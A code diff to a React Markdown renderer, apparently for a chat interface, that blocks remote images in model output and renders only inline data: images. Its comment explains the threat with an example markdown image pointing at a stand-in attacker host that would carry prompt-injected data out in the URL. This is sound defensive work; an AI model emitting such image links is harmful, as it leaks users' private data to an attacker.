@@ -32,6 +32,16 @@ const PROSE = cn(
 const components: Components = {
   pre: ({ children }) => <CodeBlock>{children}</CodeBlock>,
   a: (props) => <a target='_blank' rel='noopener noreferrer' {...props} />,
+  // Remote images in model output are an exfiltration channel: prompt-injected
+  // ![](https://attacker/?d=...) would leak whatever the model encodes into
+  // the URL the moment the browser auto-loads it. Only inline data: images
+  // render; anything remote falls back to its alt text.
+  img: ({ src, alt }) =>
+    typeof src === 'string' && src.startsWith('data:image/') ? (
+      <img src={src} alt={alt ?? ''} className='max-h-64 rounded-md' />
+    ) : (
+      <span className='text-muted-foreground italic'>{alt || '[image]'}</span>
+    ),
 };
 
 export function Markdown({ content }: { content: string }) {
